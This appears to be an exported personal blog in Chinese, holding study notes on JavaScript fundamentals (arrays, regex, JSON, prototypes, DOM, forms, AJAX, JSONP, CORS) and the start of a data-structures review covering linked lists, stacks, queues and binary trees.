[1,2,3];arr.map(x=&gt;x*2); //[2,4,6]arr.map(function(x)&#123;return x*2;&#125;); //[2,4,6] reducerray的reduce()把一个函数作用在这个Array的[x1, x2, x3...]上，这个函数必须接收两个参数，reduce()把结果继续和序列的下一个元素做累积计算。 1234567var arr = [x1,x2,x3,x4];arr.reduce((x,y)=&gt;(x+y)); //x1+x2+x3+x4var arr = [1, 3, 5, 7, 9];arr.reduce(function (x, y) &#123; return x * 10 + y;&#125;); // 13579 filterfilter也是一个常用的操作，它用于把Array的某些元素过滤掉，然后返回剩下的元素。 12345var arr = [1,2,3,4,5];var r = arr.filter(function(x)&#123; return x%2 !=0;&#125;)console.log(r); sortjs中排序算法是先把所有元素先转换为String再按照ascii码排序。 12345678var arr &#x3D; [10,20,1,2];var r &#x3D; arr.sort(function(x,y)&#123; if(x&lt;y)return 1; else if(x&gt;y)return -1; return 0;&#125;)console.log(arr) &#x2F;&#x2F;[20,10,2,1]console.log(r) &#x2F;&#x2F;[20,10,2,1] sort()方法会直接对Array进行修改，它返回的结果仍是当前Array。 闭包函数作为返回值 1234567891011function lazy_sum(arr) &#123; var sum = function () &#123; return arr.reduce(function (x, y) &#123; return x + y; &#125;); &#125; return sum;&#125;var f = lazy_sum([1,2,3,4]);f; //f是返回sum函数本身f(); //f()才是调用函数 箭头函数1234567891011121314//无&#123;&#125;的x =&gt; x*xfunction (x)&#123; return x*x;&#125;//返回多条x =&gt; &#123; ... return ; ... return ;&#125;//多个参数(x,y) =&gt; x*x+y*y//返回对象x =&gt; (&#123;foo:x&#125;); generatorgenerator由function*定义（注意多出的*号），并且，除了return语句，还可以用yield返回多次。 123456function* foo(x)&#123; yield x+1; yield x+2; return x+3;&#125;foo(2); 调用generator对象有两个方法， 一是不断地调用generator对象的next()方法next()方法会执行generator的代码，然后，每次遇到yield x;就返回一个对象{value: x, done: true/false}，然后“暂停”。返回的value就是yield的返回值，done表示这个generator是否已经执行结束了。如果done为true，则value就是return的返回值。 第二个方法是直接用for ... of循环迭代generator对象，这种方式不需要我们自己判断done。 12345678910//第一种var f = foo(2);f.next() //&#123;value: 3, done: false&#125;f.next() //&#123;value: 4, done: false&#125;f.next() //&#123;value: 5, done: true&#125;f.next() //&#123;value: undefined, done: true&#125;//第二种for(var x of foo(2))&#123; console.log(x);&#125; //3,4 标准对象 不要使用new Number()、new Boolean()、new String()创建包装对象； 用parseInt()或parseFloat()来转换任意类型到number； 用String()来转换任意类型到string，或者直接调用某个对象的toString()方法； 通常不必把任意类型转换为boolean再判断，因为可以直接写if (myVar) {...}； typeof操作符可以判断出number、boolean、string、function和undefined； 判断Array要使用Array.isArray(arr)； 判断null请使用myVar === null； 判断某个全局变量是否存在用typeof window.myVar === &#39;undefined&#39;； 函数内部判断某个变量是否存在用typeof myVar === &#39;undefined&#39;。 Date在JavaScript中，Date对象用来表示日期和时间。 1234var now &#x3D; new Date();now.getMilliseconds(); &#x2F;&#x2F;毫秒数now.getTime(); &#x2F;&#x2F;时间戳var d &#x3D; new Date(2020,6,30,8,39,30,123) &#x2F;&#x2F;自定义时间 RegExp基础\\d可以匹配一个数字 \\w可以匹配一个字母或数字 .可以匹配任意字符 *表示任意个字符 +表示至少一个字符 ?表示0个或1个字符 {n}表示n个字符 {n,m}表示n-m个字符 进阶要做更精确地匹配，可以用[]表示范围 [0-9a-zA-Z\\_]可以匹配一个数字、字母或者下划线； [0-9a-zA-Z\\_]+可以匹配至少由一个数字、字母或者下划线组成的字符串，比如&#39;a100&#39;，&#39;0_Z&#39;，&#39;js2015&#39;等等； [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]*可以匹配由字母或下划线 d号开头，后接任意个由一个数字、字母或者下划线 d号组成的字符串，也就是JavaScript允许的变量名； [a-zA-Z\\_\\$][0-9a-zA-Z\\_\\$]{0, 19}更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。 A|B可以匹配A或B ^表示行的开头，^\\d表示必须以数字开头。 $表示行的结束，\\d$表示必须以数字结束。 js正则JavaScript有两种方式创建一个正则表达式： 第一种方式是直接通过/正则表达式/写出来，第二种方式是通过new RegExp(&#39;正则表达式&#39;)创建一个RegExp对象。 1234&#x2F;&#x2F;第一种var re1 &#x3D; &#x2F;ABC&#x2F;;&#x2F;&#x2F;第二种var re2 &#x3D; new RegExp(&#39;ABC&#39;); RegExp对象的test()方法用于测试给定的字符串是否符合条件。 12re2.test(&#39;ABC&#39;); &#x2F;&#x2F;truere2.test(&#39;abc&#39;); &#x2F;&#x2F; false 切分字符串 1234'a b c'.split(' '); // ['a', 'b', '', '', 'c']'a b c'.split(/\\s+/); // ['a', 'b', 'c']'a,b, c d'.split(/[\\s\\,]+/); // ['a', 'b', 'c', 'd']'a,b;; c d'.split(/[\\s\\,\\;]+/); // ['a', 'b', 'c', 'd'] 分组 用()表示的就是要提取的分组（Group） 123var re = /^(\\d&#123;3&#125;)-(\\d&#123;3,8&#125;)$/;re.exec('010-12345'); // ['010-12345', '010', '12345']re.exec('010 12345'); // null 如果正则表达式中定义了组，就可以在RegExp对象上用exec()方法提取出子串来。 exec()方法在匹配成功后，会返回一个Array，第一个元素是正则表达式匹配到的整个字符串，后面的字符串表示匹配成功的子串。 exec()方法在匹配失败时返回null。 *贪婪匹配需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的0： 12var re &#x3D; &#x2F;^(\\d+)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;102300&#39;, &#39;&#39;] 由于\\d+采用贪婪匹配，直接把后面的0全部匹配了，结果0*只能匹配空字符串了。 必须让\\d+采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个?就可以让\\d+采用非贪婪匹配： 12var re &#x3D; &#x2F;^(\\d+?)(0*)$&#x2F;;re.exec(&#39;102300&#39;); &#x2F;&#x2F; [&#39;102300&#39;, &#39;1023&#39;, &#39;00&#39;] 全局搜索 JavaScript的正则表达式还有几个特殊的标志，最常用的是g，表示全局匹配。正则表达式还可以指定i标志，表示忽略大小写，m标志，表示执行多行匹配。 作业 1234567//请尝试写一个验证Email地址的正则表达式。var re = /^[0-9a-zA-Z\\.]+\\@[0-9a-zA-Z]+\\.(com|org)$/;hould_pass = ['someone@gmail.com', 'bill.gates@microsoft.com', 'tom@voyager.org', 'bob2015@163.com'], should_fail = ['test#gmail.com', 'bill@microsoft', 'bill%gates@ms.com', '@voyager.org'];//验证并提取出带名字的Email地址var re = /^\\&lt;(\\w+\\s+\\w+)\\&gt; (\\w+\\.*\\@\\w+\\.+\\w+)$/;shoule_pass = '&lt;Tom Paris&gt; tom@voyager.org'; 写正则首先要注意转义如：\\s ,\\w,\\d 大小写用i标志 JSON number：和JavaScript的number完全一致； boolean：就是JavaScript的true或false； string：就是JavaScript的string； null：就是JavaScript的null； array：就是JavaScript的Array表示方式——[]； object：就是JavaScript的{ ... }表示方式。 为了统一解析，JSON的字符串规定必须用双引号&quot;&quot;，Object的键也必须用双引号&quot;&quot;。 序列化123456789101112131415var xiaoming = &#123; name: 'xiaoming', age: 14, height: 165&#125;var s = JSON.stringify(xiaoming);console.log(s); //&#123;\"name\":\"xiaoming\",\"age\":14,\"height\":165&#125;var s = JSON.stringify(xiaoming,null,' '); console.log(s); //\"&#123; \"name\": \"xiaoming\", \"age\": 14, \"height\": 165&#125;\"//stringify(a,b,c)//a为对象名，b为指定的属性或者为一个函数，如['age','name'],c为' '代表逐行输出 反序列化拿到一个JSON格式的字符串，我们直接用JSON.parse()把它变成一个JavaScript对象。 JSON.parse()还可以接收一个函数，用来转换解析出的属性。 123456JSON.parse('&#123;\"name\":\"小明\",\"age\":14&#125;'); // Object &#123;name: '小明', age: 14&#125;//接受函数var obj = JSON.parse('&#123;\"name\":\"小明\",\"age\":14&#125;',function(key,value)&#123; if (key ==='name')&#123;return value + '同学'&#125; else return value;&#125;); 面向对象编程在js中没有类的概念，所有的对象都是实例，继承关系不过是把一个对象的原型指向另一个对象而已。 1234567891011121314151617181920&#x2F;&#x2F; 原型对象:var Student &#x3D; &#123; name: &#39;Robot&#39;, height: 1.2, run: function () &#123; console.log(this.name + &#39; is running...&#39;); &#125;&#125;;function createStudent(name) &#123; &#x2F;&#x2F; 基于Student原型创建一个新对象: var s &#x3D; Object.create(Student); &#x2F;&#x2F; 初始化新对象: s.name &#x3D; name; return s;&#125;var xiaoming &#x3D; createStudent(&#39;小明&#39;);xiaoming.run(); &#x2F;&#x2F; 小明 is running...xiaoming.__proto__ &#x3D;&#x3D;&#x3D; Student; &#x2F;&#x2F; true 创建对象JavaScript对每个创建的对象都会设置一个原型，指向它的原型对象。 当我们用obj.xxx访问一个对象的属性时，JavaScript引擎先在当前对象上查找该属性，如果没有找到，就到其原型对象上找，如果还没有找到，就一直上溯到Object.prototype对象，最后，如果还没有找到，就只能返回undefined。 构造函数 除了直接用{ ... }创建一个对象外，JavaScript还可以用一种构造函数的方法来创建对象。它的用法是，先定义一个构造函数： 1234567function Student(name) &#123; this.name &#x3D; name; this.hello &#x3D; function () &#123; alert(&#39;Hello, &#39; + this.name + &#39;!&#39;); &#125;&#125;var xiaoming &#x3D; new Student(&#39;xiaoming&#39;) 写了new，它就变成了一个构造函数，它绑定的this指向新创建的对象，并默认返回this，也就是说，不需要在最后写return this; 原型链： 1234567891011&#x2F;&#x2F;常用创建对象function Student(props)&#123; this.name &#x3D; props.name; this.grade &#x3D; props.grade;&#125;Student.prototype.hello &#x3D; function()&#123; alert(&#39;hello&#39;+this.name+&#39;.&#39;);&#125;function createStudent(props)&#123; return new Student(props);&#125; 要让创建的对象共享一个hello函数，根据对象的属性查找原则，我们只要把hello函数移动到xiaoming、xiaohong这些对象共同的原型上就可以了，也就是Student.prototype 原型继承12345678910111213function Student(props) &#123; this.name = props.name || 'Unnamed';&#125;Student.prototype.hello = function () &#123; alert('Hello, ' + this.name + '!');&#125;function PrimaryStudent(props) &#123; // 调用Student构造函数，绑定this变量: Student.call(this, props); this.grade = props.grade || 1;&#125;new PrimaryStudent() ----&gt; PrimaryStudent.prototype ----&gt; Object.prototype ----&gt; null 理解新的原型链 class继承class创建对象 1234567891011class Student &#123; constructor(name) &#123; this.name = name; &#125; hello() &#123; alert('Hello, ' + this.name + '!'); &#125;&#125;var xiaoming = new Student('xiaoming');xiaoming.hello(); class继承 直接通过extends实现 12345678910class PrimaryStudent extends Student &#123; constructor(name, grade) &#123; super(name); // 记得用super调用父类的构造方法! this.grade = grade; &#125; myGrade() &#123; alert('I am at grade ' + this.grade); &#125;&#125; 需要通过super(name)来调用父类的构造函数，否则父类的name属性无法正常初始化。 浏览器浏览器对象window window对象不但充当全局作用域，而且表示浏览器窗口。 innerWidth innerHeight可以获取浏览器窗口的内部高度和宽度 outerWidth outerHeight获取浏览器窗口的整个宽高 navigator navigator对象表示浏览器的信息，最常用的属性包括： navigator.appName：浏览器名称； navigator.appVersion：浏览器版本； navigator.language：浏览器设置的语言； navigator.platform：操作系统类型； navigator.userAgent：浏览器设定的User-Agent字符串。 screenscreen对象表示屏幕的信息，常用的属性有： screen.width：屏幕宽度，以像素为单位； screen.height：屏幕高度，以像素为单位； screen.colorDepth：返回颜色位数，如8、16、24。 locationlocation对象表示当前页面的URL信息。 123456789location.href &#x2F;&#x2F;urllocation.protocol; &#x2F;&#x2F; &#39;http&#39;location.host; &#x2F;&#x2F; &#39;www.example.com&#39;location.port; &#x2F;&#x2F; &#39;8080&#39;location.pathname; &#x2F;&#x2F; &#39;&#x2F;path&#x2F;index.html&#39;location.search; &#x2F;&#x2F; &#39;?a&#x3D;1&amp;b&#x3D;2&#39;location.hash; &#x2F;&#x2F; &#39;TOP&#39;location.assign(&#39;...&#39;) &#x2F;&#x2F;加载一个新的页面location.reload() &#x2F;&#x2F;重新加载当前页面 documentdocument对象表示当前页面。由于HTML在浏览器中以DOM形式表示为树形结构，document对象就是整个DOM树的根节点。 用document对象提供的getElementById()和getElementsByTagName()可以按ID获得一个DOM节点和按Tag名称获得一组DOM节点 document对象还有一个cookie属性，可以获取当前页面的Cookie。JavaScript可以通过document.cookie读取到当前页面的Cookie。 historyhistory对象保存了浏览器的历史记录，JavaScript可以调用history对象的back()或forward ()，相当于用户点击了浏览器的“后退”或“前进”按钮。但现在不使用。 操作DOM由于HTML文档被浏览器解析后就是一棵DOM树，要改变HTML的结构，就需要通过JavaScript来操作DOM。 始终记住DOM是一个树形结构。操作一个DOM节点实际上就是这么几个操作： 更新：更新该DOM节点的内容，相当于更新了该DOM节点表示的HTML的内容； 遍历：遍历该DOM节点下的子节点，以便进行进一步操作； 添加：在该DOM节点下新增一个子节点，相当于动态增加了一个HTML节点； 删除：将该节点从HTML中删除，相当于删掉了该DOM节点的内容以及它包含的所有子节点。 在操作一个DOM节点前，我们需要通过各种方式先拿到这个DOM节点。最常用的方法是document.getElementById()和document.getElementsByTagName()，以及CSS选择器document.getElementsByClassName()。 12345document.getElementById(&#39;test&#39;); &#x2F;&#x2F; 返回ID为&#39;test&#39;的节点：ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;); &#x2F;&#x2F; 先定位ID为&#39;test-table&#39;的节点，再返回其内部所有tr节点：document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;); &#x2F;&#x2F; 先定位ID为&#39;test-div&#39;的节点，再返回其内部所有class包含red的节点：test.firstElementChild &#x2F;&#x2F;test下第一个结点test.lastElementChild &#x2F;&#x2F;test下最后一个结点 第二种方法是使用querySelector()和querySelectorAll()，需要了解selector语法，然后使用条件来获取节点，更加方便。 作业 12345678910111213141516171819202122232425&lt;!-- HTML结构 --&gt;&lt;div id=\"test-div\"&gt;&lt;div class=\"c-red\"&gt; &lt;p id=\"test-p\"&gt;JavaScript&lt;/p&gt; &lt;p&gt;Java&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-red c-green\"&gt; &lt;p&gt;Python&lt;/p&gt; &lt;p&gt;Ruby&lt;/p&gt; &lt;p&gt;Swift&lt;/p&gt; &lt;/div&gt; &lt;div class=\"c-green\"&gt; &lt;p&gt;Scheme&lt;/p&gt; &lt;p&gt;Haskell&lt;/p&gt; &lt;/div&gt;&lt;/div&gt;// 选择&lt;p&gt;JavaScript&lt;/p&gt;:var js = document.getElementById('test-p');// 选择&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:var arr = document.getElementsByClassName('c-red')[1].getElementsByTagName('p');// 选择&lt;p&gt;Haskell&lt;/p&gt;:var haskell = document.getElementsByClassName('c-green')[1].lastElementChild; 更新DOM一种是修改innerHTML属性，这个方式非常强大，不但可以修改一个DOM节点的文本内容，还可以直接通过HTML片段修改DOM节点内部的子树 1234&#x2F;&#x2F;获取&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p&#39;);p.innerHTML &#x3D; &#39;ABC&#39;&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt; 第二种是修改innerText或textContent属性，这样可以自动对字符串进行HTML编码，保证无法设置任何HTML标签 123456&#x2F;&#x2F; 获取&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;var p &#x3D; document.getElementById(&#39;p-id&#39;);&#x2F;&#x2F; 设置文本:p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;&#x2F;&#x2F; HTML被自动编码，无法设置一个&lt;script&gt;节点:&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt; 插入DOM一个是使用appendChild，把一个子节点添加到父节点的最后一个子节点。 12345678910111213&lt;!-- HTML结构 --&gt;&lt;p id=\"js\"&gt;JavaScript&lt;/p&gt;&lt;div id=\"list\"&gt; &lt;p id=\"java\"&gt;Java&lt;/p&gt; &lt;p id=\"python\"&gt;Python&lt;/p&gt; &lt;p id=\"scheme\"&gt;Scheme&lt;/p&gt;&lt;/div&gt;var list = document.getElementById('list');js = document.createElement('p');js.id = 'js';js.innerText = 'javascript';list.appendChild(js); 另一个是insertBefore，可以使用parentElement.insertBefore(newElement, referenceElement); 1234567var list = document.getElementById('list'), ref = document.getElementById('python'), haskell = document.createElement('p');haskell.id = 'haskell';haskell.innerText = 'Haskell';list.insertBefore(haskell, ref); 删除DOM12345678&lt;div id=\"parent\"&gt; &lt;p&gt;First&lt;/p&gt; &lt;p&gt;Second&lt;/p&gt;&lt;/div&gt;var parent = document.getElementById('parent');parent.removeChild(parent.children[0]);parent.removeChild(parent.children[1]); // &lt;-- 浏览器报错 浏览器报错：parent.children[1]不是一个有效的节点。原因就在于，当&lt;p&gt;First&lt;/p&gt;节点被删除后，parent.children的节点数量已经从2变为了1，索引[1]已经不存在了。 操作表单HTML表单的输入控件主要有以下几种： 文本框，对应的&lt;input type=&quot;text&quot;&gt;，用于输入文本； 口令框，对应的&lt;input type=&quot;password&quot;&gt;，用于输入口令； 单选框，对应的&lt;input type=&quot;radio&quot;&gt;，用于选择一项； 复选框，对应的&lt;input type=&quot;checkbox&quot;&gt;，用于选择多项； 下拉框，对应的&lt;select&gt;，用于选择一项； 隐藏文本，对应的&lt;input type=&quot;hidden&quot;&gt;，用户不可见，但表单提交时会把隐藏文本发送到服务器。 获取值12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x2F;&#x2F;用户输入的值 设置值12var input &#x3D; document.getElementById(&#39;email&#39;);input.value &#x3D; &#39;test&#39;; &#x2F;&#x2F;文本框内容已被设置 HTML5控件HTML5新增了大量标准控件，常用的包括date、datetime、datetime-local、color等，它们都使用&lt;input&gt;标签。 提交表单方式一是通过&lt;form&gt;元素的submit()方法提交一个表单，例如，响应一个&lt;button&gt;的click事件，在JavaScript代码中提交表单。 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"button\" onclick=\"doSubmitForm()\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function doSubmitForm() &#123; var form = document.getElementById('test-form'); // 可以在此修改form的input... // 提交form: form.submit();&#125;&lt;/script&gt; 第二种方式是响应&lt;form&gt;本身的onsubmit事件，在提交form时作修改。 1234567891011121314&lt;!-- HTML --&gt;&lt;form id=\"test-form\" onsubmit=\"return checkForm()\"&gt; &lt;input type=\"text\" name=\"test\"&gt; &lt;button type=\"submit\"&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script&gt;function checkForm() &#123; var form = document.getElementById('test-form'); // 可以在此修改form的input... // 继续下一步: return true;&#125;&lt;/script&gt; 操作文件在HTML表单中，可以上传文件的唯一控件就是&lt;input type=&quot;file&quot;&gt;。 注意：当一个表单包含&lt;input type=&quot;file&quot;&gt;时，表单的enctype必须指定为multipart/form-data，method必须指定为post，浏览器才能正确编码并以multipart/form-data格式发送表单的数据。 出于安全考虑，浏览器只允许用户点击&lt;input type=&quot;file&quot;&gt;来选择本地文件，用JavaScript对&lt;input type=&quot;file&quot;&gt;的value赋值是没有任何效果的。当用户选择了上传某个文件后，JavaScript也无法获得该文件的真实路径。 *AJAX如果要让用户留在当前页面中，同时发出新的HTTP请求，就必须用JavaScript发送这个新请求，接收到数据后，再用JavaScript更新页面，这样一来，用户就感觉自己仍然停留在当前页面，但是数据却可以不断地更新。 用JavaScript写一个完整的AJAX代码并不复杂，但是需要注意：AJAX请求是异步执行的，也就是说，要通过回调函数获得响应。 当创建了XMLHttpRequest对象后，要先设置onreadystatechange的回调函数。在回调函数中，通常我们只需通过readyState === 4判断请求是否完成，如果已完成，再根据status === 200判断是否是一个成功的响应。 XMLHttpRequest对象的open()方法有3个参数，第一个参数指定是GET还是POST，第二个参数指定URL地址，第三个参数指定是否使用异步，默认是true，所以不用写。 注意，千万不要把第三个参数指定为false，否则浏览器将停止响应，直到AJAX请求完成。如果这个请求耗时10秒，那么10秒内你会发现浏览器处于“假死”状态。 最后调用send()方法才真正发送请求。GET请求不需要参数，POST请求需要把body部分以字符串或者FormData对象传进去。 安全限制 上面代码的URL使用的是相对路径。如果你把它改为&#39;http://www.sina.com.cn/&#39;，再运行，肯定报错。在Chrome的控制台里，还可以看到错误信息。默认情况下，JavaScript在发送AJAX请求时，URL的域名必须和当前页面完全一致。完全一致的意思是，域名要相同（www.example.com和example.com不同），协议要相同（http和https不同），端口号要相同（默认是:80端口，它和:8080就不同）。有的浏览器口子松一点，允许端口不同，大多数浏览器都会严格遵守这个限制。 JS请求外域的URL： 一是通过Flash插件发送HTTP请求，这种方式可以绕过浏览器的安全限制，但必须安装Flash，并且跟Flash交互。不过Flash用起来麻烦，而且现在用得也越来越少了。 二是通过在同源域名下架设一个代理服务器来转发，JavaScript负责把请求发送到代理服务器：代理服务器再把结果返回，这样就遵守了浏览器的同源策略。这种方式麻烦之处在于需要服务器端额外做开发。 第三种方式称为JSONP，它有个限制，只能用GET请求，并且要求返回JavaScript。这种方式跨域实际上是利用了浏览器允许跨域引用JavaScript资源： 123456789&lt;html&gt;&lt;head&gt; &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt; ...&lt;&#x2F;head&gt;&lt;body&gt;...&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; JSONP通常以函数调用的形式返回，例如，返回JavaScript内容如下： 1foo(&#39;data&#39;); 这样一来，我们如果在页面中先准备好foo()函数，然后给页面动态加一个&lt;script&gt;节点，相当于动态读取外域的JavaScript资源，最后就等着接收回调了。 以163的股票查询URL为例，对于URL：http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPrice，你将得到如下返回： 1refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;); 因此我们需要首先在页面中准备好回调函数： 12345678function refreshPrice(data) &#123; var p &#x3D; document.getElementById(&#39;test-jsonp&#39;); p.innerHTML &#x3D; &#39;当前价格：&#39; + data[&#39;0000001&#39;].name +&#39;: &#39; + data[&#39;0000001&#39;].price + &#39;；&#39; + data[&#39;1399001&#39;].name + &#39;: &#39; + data[&#39;1399001&#39;].price;&#125; 当前价格：上证指数: 3310.01；深证成指: 13637.883 刷新 最后用getPrice()函数触发： 1234567function getPrice() &#123; var js &#x3D; document.createElement(&#39;script&#39;), head &#x3D; document.getElementsByTagName(&#39;head&#39;)[0]; js.src &#x3D; &#39;http:&#x2F;&#x2F;api.money.126.net&#x2F;data&#x2F;feed&#x2F;0000001,1399001?callback&#x3D;refreshPrice&#39;; head.appendChild(js);&#125; 就完成了跨域加载数据。 CORS CORS全称Cross-Origin Resource Sharing 本域：Origin，也就是浏览器当前页面的域。 外域：指向的访问网页 当JavaScript向外域发起请求后，浏览器收到响应后，首先检查Access-Control-Allow-Origin是否包含本域，如果是，则此次跨域请求成功，如果不是，则请求失败，JavaScript将无法获取到响应的任何数据。 PromisePromise对象先统一执行AJAX逻辑，不关心如何处理结果，然后，根据结果是成功还是失败，在将来的某个时候调用success函数或fail函数。 对Promise和AJAX理解还不是很深刻，回头继续看。 CanvasCanvas是HTML5新增的组件，它就像一块幕布，可以用JavaScript在上面绘制各种图表、动画等。 1234&lt;!-- HTML代码 --&gt;&lt;canvas id&#x3D;&quot;test-canvas&quot; width&#x3D;&quot;200&quot; heigth&#x3D;&quot;100&quot;&gt; &lt;p&gt;你的浏览器不支持Canvas&lt;&#x2F;p&gt;&lt;&#x2F;canvas&gt; 后面的jQuery，Node.js和React之后再看。","categories":[{"name":"前端","slug":"前端","permalink":"https://pz1o.top/categories/%E5%89%8D%E7%AB%AF/"}],"tags":[{"name":"前端","slug":"前端","permalink":"https://pz1o.top/tags/%E5%89%8D%E7%AB%AF/"},{"name":"学习","slug":"学习","permalink":"https://pz1o.top/tags/%E5%AD%A6%E4%B9%A0/"}]},{"title":"数据结构复习","slug":"数据结构复习","date":"2020-06-30T07:45:07.000Z","updated":"2020-11-20T14:20:13.640Z","comments":true,"path":"2020/06/30/数据结构复习/","link":"","permalink":"https://pz1o.top/2020/06/30/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/","excerpt":"","text":"数据结构复习根据老师重点，复习数据结构。 线性表循环链表循环链表的产生：在单链表中，（1）只知道一个结点，想知道所有结点是不太行的。（2）如果要找一个结点的直接前驱结点，需要从表端一个一个结点查找，时间开销到达了O（n）。 循环链表的概念将单链表的首尾相连，使终端结点的指针域指向头结点，构成单向循环链表。 循环链表中可以带头指针和尾指针。 头指针： 尾指针： 循环链表的插入 123//具体操作s-&gt;link = p-&gt;link;p-&gt;link = s; 双向链表双向链表的产生：解决单链表中的（2） 双向链表的概念双向链表中的每个结点都有一个前驱指针和一个后继指针和数据域。 1p &#x3D; p-&gt;rlink-&gt;llink &#x3D; p-&gt;llink-&gt;rlink; 双向链表的插入双向链表的插入分为前驱方向的插入和后继方向的插入‘。 后继: 12345&#x2F;&#x2F;具体操作newnode-&gt;rlink &#x3D; current-&gt;rlink;current-&gt;rlink &#x3D; newnode;newnode-&gt;rlink-&gt;llink &#x3D; newnode;newnode-&gt;llink &#x3D; current; 前驱（相当于反向的后继）： 12345&#x2F;&#x2F;具体操作newnode-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink &#x3D; newnode;newnode-&gt;llink-&gt;rlink &#x3D; newnode;newnode-&gt;rlink &#x3D; current; 双向链表的删除 123&#x2F;&#x2F;具体操作current-&gt;rlink-&gt;llink &#x3D; current-&gt;llink;current-&gt;llink-&gt;rlink &#x3D; current-&gt;rlink; 栈栈的定义 只允许在一端插入和删除的线性表。（后进先出） 栈顶：允许插入和删除的一端。 栈底：不允许插入和删除的一端。 顺序栈 栈顶指针top=maxsize-1，则表示栈满。 列车调度问题 如上图所述，有多少种不同的出栈序列？ 123456F(n)&#x3D;F(0)*F(n-1)+F(1)*F(n-2)+...+F(n-1)*F(n-n)F(0)&#x3D;1F(1)&#x3D;F(0)*F(0)&#x3D;1F(2)&#x3D;F(0)*F(2-1)+F(0)*F(2-2)&#x3D;2F(3)&#x3D;F(0)*F(3-1)+F(1)*F(3-2)+F(2)*F(3-3)&#x3D;5F(4)&#x3D;F(0)*F(4-1)+F(1)*F(4-2)+F(2)*F(4-3)+F(3)*F(4-4)&#x3D;14 在1423序列中，我们观察子序列423，发现2夹在4和3之间，即最大的数先出栈，最小的数中间出栈，中间的数最后出栈——这无论如何不可能出现，因为它违反栈“后进先出”的特点；同样2413序列中1夹在4和3之间，3412序列中1夹在4和2之间，4312序列中1夹在3和2之间，这都违反LOFI规律。 链式栈用单链表来表示栈，为链式栈。 链式栈无栈满问题。 链式栈的栈顶在链头。 插入和删除在栈顶执行。 *括号匹配 *中缀表达式转换成后缀表达式 除左括号和右括号外，同一操作符栈内优先级大于栈外优先级。 若栈外操作符优先级大于栈内操作符，则栈外操作符进栈；否则，出栈。 栈与递归 定义是递归的（斐波那契数列） 数据结构是递归的（树，链表） 问题解法是递归的 汉诺塔问题 用 C 柱做过渡，将 A 柱上的 (n-1) 个盘子移到 B 柱上； 将 A 柱上最后一个盘子直接移到 C 柱上； 用 A 柱做过渡，将 B 柱上的 (n-1) 个盘子移到 C 柱上。 123456789101112131415void Hanoi(int n,char a,char b,char c)&#123; if(n==1)&#123; move(n,A,C); &#125; else&#123; Hanoi(n-1,A,C,B); move(n,A,C); Hanoi(n-1,B,A,C); &#125; &#125;void move(int n,char A,char C)&#123; cout &lt;&lt; \"Move \"&lt;&lt; n &lt;&lt;\"From \"&lt;&lt; A &lt;&lt;\"To \"&lt;&lt; C;&#125; 队列队列的定义： 只允许在一端删除，在另一端插入的线性表。（先进先出） 队头：允许删除的=一端。 队尾：允许插入的一端。 循环队列 队列初始化：=front = rear = 0; 队头指针进1: front = (front+1) % maxSize; 队尾指针进1: rear = (rear+1) % maxSize; 队空条件：front == rear; 队满条件：(rear+1) % maxSize == front ; 循环队列只能存放（maxSize-1）个元素； 循环队列中元素的个数为：(rear-front+maxSize)%maxSize; 链式队列 队头在链头，队尾在链尾。 队空为 front == NULL 数组数组的存储表示： 设第一个数组元素的存储地址为a，每一个数组元素的存储大小为l 在一维数组中：$LOC(i)=a+i*l$ 在二维数组中,按照行优先存储，每一行最多存储元素为m个：$LOC(j,k)=a+(j*m+k)l$ 散列表树树的基本概念结点的层次：根节点在第一层，其他类推。 深度：树中距离根结点最远的结点所在的层次叫做树的深度。 高度：高度与深度数值相等，但方向不同。根节点的高度就叫做树的高度。 结点的度：结点所拥有的子树棵树。 树的度：树中结点的度的最大值。 二叉树二叉树的定义 每个结点最多有两棵子树 左子树和右子树不可颠倒 二叉树的五种形态： 二叉树的性质 二叉树的第i层最多有$2^{i-1}$个结点 深度为k的二叉树最少有k个结点，最多有$2^k-1$个结点 对任何一棵二叉树，如果其叶结点有 n0 个, 度为 2 的非叶结点有 n2 个, 则有n0＝n2＋1 具有 n (n≥0) 个结点的完全二叉树的深度为 $\\lceil log2(n+1)\\rceil$ 如将一棵有n个结点的完全二叉树自顶向下，同一层自左向右连续给结点编号1, 2, …, n，则有以下关系：若i = 1, 则 i 无双亲若i &gt; 1, 则 i 的双亲为$\\lfloor i／2\\rfloor$i 的左子女为 2 i(如果i有左子女的话)， i 的右子女为2 i+1 (如果i有右子女的话)若 i 为奇数, 且i != 1, 则其左兄弟为i-1,若 i 为偶数, 且i != 1, 则其右兄弟为i+1 